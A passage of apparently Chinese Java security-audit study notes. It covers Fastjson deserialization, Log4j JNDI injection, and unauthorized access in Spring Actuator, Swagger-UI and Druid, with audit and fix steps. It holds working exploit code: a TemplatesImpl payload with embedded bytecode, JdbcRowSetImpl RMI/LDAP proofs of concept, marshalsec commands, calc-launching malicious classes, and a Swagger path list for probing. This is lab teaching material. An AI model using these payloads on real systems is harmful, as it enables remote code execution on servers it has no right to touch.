        byte[] bytes = Files.readAllBytes(Paths.get("D:\\code\\java\\fastjson\\target\\classes\\Evil.class"));
      //从指定位置读取一个名为Evil.class的Java类文件，并将其内容作为字节数组存储在bytes变量中
        String code = Base64.getEncoder().encodeToString(bytes);
      //将字节数组转换为Base64编码的字符串
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\"" + code + "\"]," +
                "'_name':'xbb'," +
                "'_tfactory':{}," +
                "\"_outputProperties\":{}}\n";

        System.out.println(payload);

        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
````

得到最终得payload

```
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQATAoADwAuCQAvADAIADEKADIAMwgANAgANQgANgoANwA4CAA5CgA3ADoHADsHADwKAAwAPQcAPgcAPwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEV2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAEABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2FyZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAiACMHAEEMAEIAQwEAD+aehOmAoOS7o+eggeWdlwcARAwARQAkAQAM5peg5Y+C5p6E6YCgAQAM5pyJ5Y+C5p6E6YCgAQAP6Z2Z5oCB5Luj56CB5Z2XBwBGDABHAEgBAARjYWxjDABJAEoBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MACIASwEABEV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAA4ADwAAAAAABQABABAAEQACABIAAAA/AAAAAwAAAAGxAAAAAgATAAAABgABAAAADgAUAAAAIAADAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABAAHQACABIAAABJAAAABAAAAAGxAAAAAgATAAAABgABAAAAEwAUAAAAKgAEAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiACMAAQASAAAASwACAAEAAAAVKrcAAbIAAhIDtgAEsgACEgW2AASxAAAAAgATAAAAEgAEAAAAIwAEACAADAAkABQAJQAUAAAADAABAAAAFQAVABYAAAABACIAJAABABIAAABVAAIAAgAAABUqtwABsgACEgO2AASyAAISBrYABLEAAAACABMAAAASAAQAAAApAAQAIAAMACoAFAArABQAAAAWAAIAAAAVABUAFgAAAAAAFQAlACYAAQAIACcAIwABABIAAAByAAMAAQAAAB+yAAISB7YABLgACBIJtgAKV6cADUu7AAxZKrcADb+xAAEACAARABQACwADABMAAAAaAAYAAAAWAAgAGAARABsAFAAZABUAGgAeAB0AFAAAAAwAAQAVAAkAKAApAAAAKgAAAAcAAlQHACsJAAEALAAAAAIALQ=="],'_name':'xbb','_tfactory':{},"_outputProperties":{}}

```

**基于JdbcRowSetImpl**

```
基于JdbcRowSetImpl的利用链主要有利用方式有 JNDI+RMI和JNDI+LDAP 
```

构造 poc： 

```java
{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"rmi://127.0.0.1:1099/EvilCalc",
	"autoCommit":true
}
```

```java
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://127.0.0.1:1389/EvilCalc",
	"autoCommit":true
}
```

@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中 心绑定的EvilCalc服务，autoCommit有且必须为true或false等布尔值类型

启动RMI服务：（使用 marshalsec 工具来完成） 

```java
https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/R MIRefServer.java 
```

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/\#EvilCalc
```

编写恶意类EvilCalc

```java
import java.io.IOException;
    public class EvilCalc {
        public EvilCalc()throws IOException {
            Runtime.getRuntime().exec("calc");
        }
        public static void main(String[] args) throws IOException {
            EvilCalc evilCalc = new EvilCalc();
        }
}
```

编译为Class文件,启动Web服务，将恶意类文件存放在本地：

测试类：

```java
package com.example.test;

import com.alibaba.fastjson.JSON;


/**
 *Fastjson 1.2.22-1.2.24版本的反序列化漏洞
 *基于JdbcRowSetImpl利用链
 大
 **/
 public class POC2 {
     
    public static void main(String[] args) {
         String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilCalc\", \"autoCommit\":true}";
        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0 /.1:1389/EvilCalc\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
 }
```

linux、mac和windows环境不同，**加载恶意类工具启动命令不同，否则无法加载到远程的web服务**

```java
（1）window: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8888/#EvilCalc"
  (2)   linux:  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/\#EvilCalc
```

**区别点：window需要加""在连接、转义符问题**

**注意RMI和LDAP对JDK版本的要求，如果两个需要同时满足，直接安装**jdk1.8.0_101



**FastJson <= 1.2.48 反序列化漏洞 **

环境搭建-直接在pom.xml中引入相关版本的依赖

```xml
       <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.47</version>
        </dependency>
        <dependency>
            <groupId>commons-codec</groupId>
            <artifactId>commons-codec</artifactId>
            <version>1.15</version>
        </dependency>
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>2.5</version>
        </dependency>
```

编写恶意类，并将其编译成class类文件

```java
package com.example.test;

public class EvilCalc1 {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String commands = "calc";
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }

    public static void main(String[] args) {
        EvilCalc1 poc3 = new EvilCalc1();
    }
}
```

编译的时候包名称去掉侯采取手动javac命令编译，否则会加载恶意类的时候回出错

使用python开启web服务，编译好的恶意类访问web更目录下

```java
python -m SimpleHTTPServer 8000  //对于 Python 2.x：

python -m http.server 8000  //对于 Python 3.x：
```

使用marshalsec-0.0.3-SNAPSHOT-all.jar开启RMI或LDAR服务，使其具备远程加载web服务下（上一步）下的恶意类的提交

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8000/#EvilCalc1"
```

编写并运行poc，即可触发漏洞

```java
package com.example.test;
import com.alibaba.fastjson.JSON;
/**
 *  FastJson <= 1.2.48 反序列化漏洞
 *基于JdbcRowSetImpl利用链
 大
 **/
public class POC3 {
    public static void main(String[] args) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/#EvilCalc1\",\"autoCommit\":true}}}";
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/EvilCalc\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

**FastJson <= 1.2.62 反序列化漏洞 **

poc如下：

```java
String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/exploit\"}";

```

测试类

```java
/**
 *  FastJson <= 1.2.62 反序列化漏洞  测试类
 **/
public class POC4 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
      //通过ParserConfig获取全局实例，并设置了自动类型支持为true。Fastjson库中的ParserConfig允许配置解析器的行为，其中的setAutoTypeSupport(true)操作允许反序列化时自动检测和使用类型信息。
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://127.0.0.1:1389/EvilCalc1\"}";
        JSON.parse(poc);
    }
}
```

## 十二、log4j漏洞

```
Apache Log4j2是⼀个基于Java的⽇志记录⼯具。
该⼯具重写了Log4j框架，并且引⼊了⼤量丰富的特性。
使用1.8_65和1.8_151都可以直接触发，
```

针对CC3链没有思路的问题解答
（1）先定位漏洞属于通用型漏洞还是属于程序自编码漏洞
（2）需要回顾这种漏洞的特点和规律
（3）踩点，寻找源码是否引用了与漏洞相关的组件和寻找漏洞入口（突破口）
比如去查看该项目下是否使用了CC组件，
对于maven项目通过pom文件确定  
对于非maven的传统项目，去找jar,往往放在一个lib,比如webapp/web-inf/lib
（4）漏洞分析与追踪
需要符合两个要求：（1）对这个组件有一定的了解 （2）熟悉这个漏洞的原理

审计思路
以Log4j漏洞审计为案例，谈一谈审计如何快速的锁定通用型漏洞
1、确定源码是否引用了漏洞所属的开源组件
该项目是一个maven项目，直接在Pom文件中搜索log4j的jar包及版本引用问题，如果该版本受影响，进入下一步

<img width="583" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b1d8370f-81e7-411e-80f5-9b56d90f291e">

2、寻找漏洞的入口

<img width="362" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/7e3be53b-594e-4473-9196-3c964be8ecd5">

3、逐个排查入口是否有效，有效即可复现

### （一）、漏洞原理

**（1）、JDNI原理**

- JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于**命名空间**的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。**这意味着任何基于名字的技术都能通过JNDI而提供服务**，只要JNDI支持这项技术。 

- JNDI目前所支持的技术包括**LDAP**、CORBA Common Object Service（COS）名字服务、**RMI**、NDS、**DNS**、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。JDNI通过绑定的概念将**对象和名称联系起来**。**在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。** 

- JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如**，每个上下文提供了一个查找操作，返回指定名字的相应对象**。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。
  简单来说：通过JNDI提供了"通**过名称找到对应的对象"的规范定义**，即SPI功能，实现则由具体的技术支持，如：LDAP，RMI，DNS，Database。

**（2）、LDAP原理**

- 目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。

- LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。

- 目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。

- **LDAP目录服务是由目录数据库和一套访问协议组成的系统**。

**（3）、漏洞介绍**

 Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端获取对应的Class文件，使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。

![image-20231127142522983](/Users/bingtanghulu/Library/Application Support/typora-user-images/image-20231127142522983.png)

（1）首先攻击者找到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。

（2）被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。

（3）此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。

```java
StrSubstitutor.substitute(...) --解析出${}中的内容：jndi:ldap://localhost:9999/Test
	> StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup
	> Interpolator.lookup(...) --根据jndi找到jndi的处理类
		> JndiLookup.lookup(...)
		> JndiManager.lookup(...)
			> java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
```

后续步骤都是Java内部提供的Lookup能力，和Log4j2无关。

（4）请求Ldap服务器，获取到Ldap协议数据。Ldap会返回一个Codebase告诉客户端，需要从该Codebase去获取其需要的Class数据

```java
LdapCtx.c_lookup(...) 请求并处理数据 （ldap中指定了javaCodeBase=）
	>Obj.decodeObject --解析到ldap结果，得到classFactoryLocation=http://localhost:8888
	> DirectoryManager.getObjectInstance(...) --请求Codebase得到对应类的结果
		> NamingManager.getObjectFactoryFromReference(...) --请求Codebase
```

（5）请求Ldap中返回的Codebase路径，去Codebase下载对应的Class文件，并通过类加载器将其加载为Class类，然后调用其默认构造函数将该Class类实例化成一个对象。

```java
VersionHelper12.loadClass(...) --请求Codebase得到Class并用类加载器加载

> ​	NamingManager.getObjectFactoryFromReference(...) 通过默认构造函数**实例化类。
```

**这里就会导致我们攻击代码中的静态块中的内容被执行。**

总结：

1、攻击则发送带有恶意Ldap内容的字符串，让服务通过log4j2打印

2、log4j2解析到ldap内容，会调用底层Java去执行Ldap的lookup操作。

3、Java底层请求Ldap服务器（恶意服务器），得到了Codebase地址，告诉客户端去该地址获取他需要的类。

4、Java请求Codebase服务器(恶意服务器)获取到对应的类（恶意类），并在**本地加载和实例化**（触发恶意代码）。

## 十三、常见的未授权漏洞
### （一）、Springboot Actuator未授权漏洞

目前SpringBoot框架，越来越广泛，大多数中小型企业，在开发新项目得时候。后端语言使用java得情况下，首选都会使用到SpringBoot。

actuator是Springboot提供的用来对应用系统进行自身和监控的功能模块，借助于Actuator可以很方便地对应用系统某些监控指标进行查看、统计等。Actuator 的核心是端点 Endpoint，它用来监视应用程序及交互，spring-boot-actuator 中已经内置了非常多的Endpoint（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的Endpoints。每个 Endpoint 都可以启用和禁用。要远程访问 Endpoint，还必须通过 JMX 或 HTTP 进行暴露，大部分应用选择HTTP。**Actuator在带来方便的同时，如果没有管理好，会导致一些敏感的信息泄露；可能会导致我们的服务器，被暴露到外网，服务器可能会沦陷。泄露的信息报错不局限于接口API、可能会涉及到数据库，redis等等的连接信息，一旦泄露具有严重的安全隐患。**

环境搭建与复现

创建或直接找一个开源的sringboot项目，在pom文件中直接引入相关依赖即可

```xml
<!--健康监控-->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-actuator</artifactId>
    </dependency>
```

在application 进行以下设置

```java
info:
  application:
    name: "@project.name@" #从pom.xml中获取
    description: "@project.description@"
    version: "@project.version@"
management:
  server:
    port: 5400  # 指定监听端口，不指定则与server端口一直
  endpoints: # 启动所有监控点
    web:
      exposure:
        include: '*'
  info: # spring-boot 2.6以后info默认值为false.需手动开启
    env:
      enabled: true
```

当访问http://localhost:5400/actuator/beans，出现页面且无需授权，说明引入成功

可能会出现一个问题，当项目使用了全局拦截技术，例如shiro控制全局权限，直接访问路径会出现无法访问强制跳转到登录页面。需要将其路径添加到过滤器白名单

<img width="955" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/3f8c0e7d-ca30-4776-ba14-72c29df07ca7">


**审计及修复**

主要审计方法：

1、确定springboot项目是否引用了spring actuator组件进行监控

2、如果引用了该组件，看是否采取了默认的设置，也就是说看是否进行了访问认证。

常见的修复方式如下：

（1）如使用，只开放必要应用，可禁用env等敏感信息的访问。

使用exclude属相进行禁用env

```java
management:
  server:
    port: 5400  # 指定监听端口，不指定则与server端口一直
  endpoints: # 启动所有监控点
    web:
      exposure:
        exclude: 'env'
      # include: '*'  # 允许访问所有的应用
  info: # spring-boot 2.6以后info默认值为false.需手动开启
    env:
      enabled: true
```

当在访问时出现无法访

（2）在application.properties中开启security功能，配置访问权限验证，这时再访问actuator功能时就会弹出登录窗口，需要输入账号密码验证后才允许访问。

首先引入springsecurity的组件，并配置拦截配置文件

```java
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

```java
package com.hospital.web.core.config;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
// 使用@Configuration注解表示这个类是一个配置类。
@Configuration
//// 使用@EnableWebSecurity注解启用Spring Security的功能
@EnableWebSecurity
public class ActuatorSecurityConfig extends WebSecurityConfigurerAdapter {
// 使用@Autowired注解自动注入Environment对象。这样就可以获取应用的配置信息。
    @Autowired
    Environment env;

   protected void configure(HttpSecurity httpSecurity) throws Exception {
     //使用httpBasic()方法启用HTTP基本认证。  
        httpSecurity.httpBasic()
                .and()
                .authorizeRequests()
                .antMatchers("/actuator/**").authenticated()
                .anyRequest().permitAll()
                .and()
                .csrf().disable();
    }
}
```

其中主要设置了HTTP基本认证，并针对"/actuator/**"路径的请求要求身份验证，而其他所有请求则不需要身份验证。

（3）如果不使用actuator直接全部禁用

可通过代码配置(直接注释掉一下代码也可以)，或直接去除掉spingboot-actuator的组件引用

```java
management.server.port=-1
```

<img width="462" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/ce2134db-312a-4870-ba28-c0e35426212b">


### （二）、Swigger-ui未授权漏洞

Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。可利用未授权访问漏洞，直接访问以下链接：

```xml
/api
/api-docs
/api-docs/swagger.json
/api.html
/api/api-docs
/api/apidocs
/api/doc
/api/swagger
/api/swagger-ui
/api/swagger-ui.html
/api/swagger-ui.html/
/api/swagger-ui.json
/api/swagger.json
/api/swagger/
/api/swagger/ui
/api/swagger/ui/
/api/swaggerui
/api/swaggerui/
/api/v1/
/api/v1/api-docs
/api/v1/apidocs
/api/v1/swagger
/api/v1/swagger-ui
/api/v1/swagger-ui.html
/api/v1/swagger-ui.json
/api/v1/swagger.json
/api/v1/swagger/
/api/v2
/api/v2/api-docs
/api/v2/apidocs
/api/v2/swagger
/api/v2/swagger-ui
/api/v2/swagger-ui.html
/api/v2/swagger-ui.json
/api/v2/swagger.json
/api/v2/swagger/
/api/v3
/apidocs
/apidocs/swagger.json
/doc.html
/docs/
/druid/index.html
/graphql
/libs/swaggerui
/libs/swaggerui/
/spring-security-oauth-resource/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/sw/swagger-ui.html
/swagger
/swagger-resources
/swagger-resources/configuration/security
/swagger-resources/configuration/security/
/swagger-resources/configuration/ui
/swagger-resources/configuration/ui/
/swagger-ui
/swagger-ui.html
/swagger-ui.html#/api-memory-controller
/swagger-ui.html/
/swagger-ui.json
/swagger-ui/swagger.json
/swagger.json
/swagger.yml
/swagger/
/swagger/index.html
/swagger/static/index.html
/swagger/swagger-ui.html
/swagger/ui/
/Swagger/ui/index
/swagger/ui/index
/swagger/v1/swagger.json
/swagger/v2/swagger.json
/template/swagger-ui.html
/user/swagger-ui.html
/user/swagger-ui.html/
/v1.x/swagger-ui.html
/v1/api-docs
/v1/swagger.json
/v2/api-docs
/v3/api-docs
```

Swagger未开启页面访问限制，Swagger未开启严格的Authorize认证。通过翻查文档，得到api接口，得到api接口，点击parameters，即可得到该api接口的详细参数。直接构造参数发包，通过回显可以得到大量的用户信息，包含了手机号，邮箱等。

**环境搭建与复现**

引入swagger相关的依赖，以hostipal项目为例，直接在pom.xml引入依赖

```xml
			<!-- swagger2-->
			<dependency>
				<groupId>io.springfox</groupId>
				<artifactId>springfox-swagger2</artifactId>
				<version>${swagger.version}</version>
				<exclusions>
				    <exclusion>
				        <groupId>io.swagger</groupId>
				        <artifactId>swagger-annotations</artifactId>
				    </exclusion>
				    <exclusion>
				        <groupId>io.swagger</groupId>
				        <artifactId>swagger-models</artifactId>
				    </exclusion>
				</exclusions>
			</dependency>
			
			<!-- swagger2-UI-->
			<dependency>
				<groupId>io.springfox</groupId>
				<artifactId>springfox-swagger-ui</artifactId>
				<version>${swagger.version}</version>
			</dependency>
```

设置相关配置文件

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import com.hospital.common.config.Global;
import io.swagger.annotations.ApiOperation;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.service.Contact;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

/**
 * Swagger2的接口配置
 *
 * @author wangchunhong
 */
@Configuration
@EnableSwagger2
public class SwaggerConfig
{
    /**
     * 创建API
     */
    @Bean
    public Docket createRestApi()
    {
        return new Docket(DocumentationType.SWAGGER_2)
                // 用来创建该API的基本信息，展示在文档的页面中（自定义展示的信息）
                .apiInfo(apiInfo())
                // 设置哪些接口暴露给Swagger展示
                .select()
                // 扫描所有有注解的api，用这种方式更灵活
                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
                // 扫描指定包中的swagger注解
                //.apis(RequestHandlerSelectors.basePackage("com.hospital.project.tool.swagger"))
                // 扫描所有 .apis(RequestHandlerSelectors.any())
                .paths(PathSelectors.any())
                .build();
    }

    /**
     * 添加摘要信息
     */
    private ApiInfo apiInfo()
    {
        // 用ApiInfoBuilder进行定制
        return new ApiInfoBuilder()
                // 设置标题
                .title("标题：若依管理系统_接口文档")
                // 描述
                .description("描述：用于管理集团旗下公司的人员信息,具体包括XXX,XXX模块...")
                // 作者信息
                .contact(new Contact(Global.getName(), null, null))
                // 版本
                .version("版本号:" + Global.getVersion())
                .build();
    }
}
```

3、向各个controller中提供@Api，也就是说将API通过swigger-ui对外开放，参考如下

```java
@Api(description = "系统用户相关接口", tags = ApiIndex.UserController)
@RequestMapping(value = "/api/user")
@RestController
public class UserController {
    @Autowired
    IUserService service;
 
	@ApiOperation(value = "查询列表")
    @GetMapping(value = "/list")
    @ApiImplicitParam(name = "token", value = "签名", paramType = "query", dataType = "String")
    @Token
    public R<PageInfo<List<UserVO>>> list(
            @ApiParam(value = "查询参数") @ModelAttribute UserSearchVO searchVO) {
        List<UserVO> list = service.getList(searchVO);
        PageInfo pageInfo = new PageInfo(list);
        return new R(pageInfo);
    }
```

4、重启服务，直接访问[http://localhost/swagger-ui.html](http://localhost:8080/swagger-ui.html)

<img width="958" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/a0ff5010-20a8-41d6-94fa-9a8f76ee6dd7">


**审计及修复**

1、审计方式：

- 主要是排查看pom.xml文件中是否引用了swagger组件
- 是否存在SwaggerConfig相关的配置代码
- 各个controller类中的接口是否引用了@Api，各个方法中是否引用了@ApiOperation。

同时存在以上三种情况，可以确定存在该漏洞。

2、修复方式

1. 配置Swagger开启页面访问限制。

（1）修改application.yml中的swagger配置

```xml
swagger:
  ui-config:
    # method<按方法定义顺序排序>
    operations-sorter: method
  basic:
    enable: true
    ## Basic认证用户名
    username: admin
    ## Basic认证密码
    password: nimda
```

（2）修改swagger2Config文件，具体可参考如下

```java
@Slf4j
@Configuration
@EnableSwagger2
@EnableSwaggerBootstrapUI
@Profile({"dev","test"})
public class Swagger2Config implements WebMvcConfigurer {
 
	/**
	 *
	 * 显示swagger-ui.html文档展示页，还必须注入swagger资源：
	 * 
	 * @param registry
	 */
	@Override
	public void addResourceHandlers(ResourceHandlerRegistry registry) {
		registry.addResourceHandler("swagger-ui.html").addResourceLocations("classpath:/META-INF/resources/");
		registry.addResourceHandler("doc.html").addResourceLocations("classpath:/META-INF/resources/");
		registry.addResourceHandler("/webjars/**").addResourceLocations("classpath:/META-INF/resources/webjars/");
	}
 
	/**
	 * swagger2的配置文件，这里可以配置swagger2的一些基本的内容，比如扫描的包等等
	 *
	 * @return Docket
	 */
	@Bean
	public Docket createRestApi() {
		return new Docket(DocumentationType.SWAGGER_2)
				.apiInfo(apiInfo())
				.select()
				//此包路径下的类，才生成接口文档
				.apis(RequestHandlerSelectors.basePackage("org.jeecg.modules"))
				//加了ApiOperation注解的类，才生成接口文档
	            .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
				.paths(PathSelectors.any())
				.build()
				.securitySchemes(Collections.singletonList(securityScheme()))
				.securityContexts(securityContexts())
				.globalOperationParameters(setHeaderToken());
	}
 
	/***
	 * oauth2配置
	 * 需要增加swagger授权回调地址
	 * http://localhost:8888/webjars/springfox-swagger-ui/o2c.html
	 * @return
	 */
	@Bean
	SecurityScheme securityScheme() {
		return new ApiKey(DefContants.X_ACCESS_TOKEN, DefContants.X_ACCESS_TOKEN, "header");
	}
 
	private List<SecurityContext> securityContexts() {
		List<SecurityContext> securityContexts=new ArrayList<>();
		securityContexts.add(
				SecurityContext.builder()
						.securityReferences(defaultAuth())
						.forPaths(PathSelectors.regex("^(?!auth).*$"))
						.build());
		return securityContexts;
	}
 
	List<SecurityReference> defaultAuth() {
		AuthorizationScope authorizationScope = new AuthorizationScope("global", "accessEverything");
		AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
		authorizationScopes[0] = authorizationScope;
		List<SecurityReference> securityReferences=new ArrayList<>();
		securityReferences.add(new SecurityReference("Authorization", authorizationScopes));
		return securityReferences;
	}
	/**
	 * JWT token
	 * @return
	 */
	private List<Parameter> setHeaderToken() {
        ParameterBuilder tokenPar = new ParameterBuilder();
        List<Parameter> pars = new ArrayList<>();
        tokenPar.name(DefContants.X_ACCESS_TOKEN).description("token").modelRef(new ModelRef("string")).parameterType("header").required(false).build();
        pars.add(tokenPar.build());
        return pars;
    }
 
	/**
	 * api文档的详细信息函数,注意这里的注解引用的是哪个
	 *
	 * @return
	 */
	private ApiInfo apiInfo() {
		return new ApiInfoBuilder()
				// //大标题
				.title("Jeecg-Boot 后台服务API接口文档")
				// 版本号
				.version("1.0")
//				.termsOfServiceUrl("NO terms of service")
				// 描述
				.description("后台API接口")
				// 作者
				.contact("JEECG团队")
                .license("The Apache License, Version 2.0")
                .licenseUrl("http://www.apache.org/licenses/LICENSE-2.0.html")
				.build();
	}
```

当在访问[http://localhost/swagger-ui.html](http://localhost:8080/swagger-ui.html),将会要求授权认证

### （三）、druid未授权漏洞

Druid是为监控而生的数据库连接池，是阿里巴巴数据库事业部出品。Druid提供的监控功能，有数据源、SQL监控、SQL防火墙、Web应用、URL监控、Session监控、Spring监控、JSON API等等。当开发者配置不当时就可能造成未授权访问。

